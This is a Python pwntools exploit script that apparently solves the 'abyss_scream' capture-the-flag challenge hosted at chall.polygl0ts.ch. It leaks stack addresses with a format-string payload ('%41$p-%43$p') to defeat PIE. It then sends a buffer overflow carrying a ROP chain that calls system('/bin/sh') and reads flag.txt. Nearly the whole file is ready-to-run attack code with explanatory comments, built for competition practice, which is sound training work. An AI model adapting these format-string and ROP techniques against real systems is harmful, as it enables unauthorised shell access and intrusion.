#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template 2048
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('abyss_scream')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

host = args.HOST or 'chall.polygl0ts.ch'
port = int(args.PORT or 9001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *save_msg+275
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
main_128_offset = 0x139e
system_offset = 0x129e
pop_rdi = 0x13b5
io.recvuntil(b'Enter input: ')
io.sendline(b'x')
io.recvuntil(b"we'll take your name: ")

# we store the /bin/sh string as our name so that we can use it later in our rop
io.sendline(b"/bin/sh") 

io.recvuntil(b'add a message: ')
# we use the format string vulnerability in the message to leak the address of the name that currently points to our /bin/sh and also leak main + 108, so that we can retrieve pie
io.sendline(b"%41$p-%43$p") 
io.recvline()

# we use the offsets defined above to calculate the pie base
c = [x for x in io.recvline().split(b'-')]
name_addr, main_128_addr = [int(x[2:], 16) for x in c]
pie_base = main_128_addr - main_128_offset
log.info(f"Address of name: {hex(name_addr)}")
log.info(f"Address of main: {hex(main_128_addr)}")
log.info(f"Pie Base: {hex(pie_base)}")


io.recvuntil(b'Enter input: ')
io.sendline(b'x')
io.recvuntil(b"we'll take your name: ")
io.sendline(b"B"*7)
io.recvuntil(b'add a message: ')

# rop chain to call system("/bin/sh") using the leaked information
payload = b"A"*(256+24)
payload += p64(pie_base + pop_rdi)
payload += p64(name_addr)
payload += p64(pie_base + system_offset)
io.sendline(payload)
io.recv()
io.sendline(b"cat flag.txt")
flag = io.recv()
print(flag.decode())
io.close()

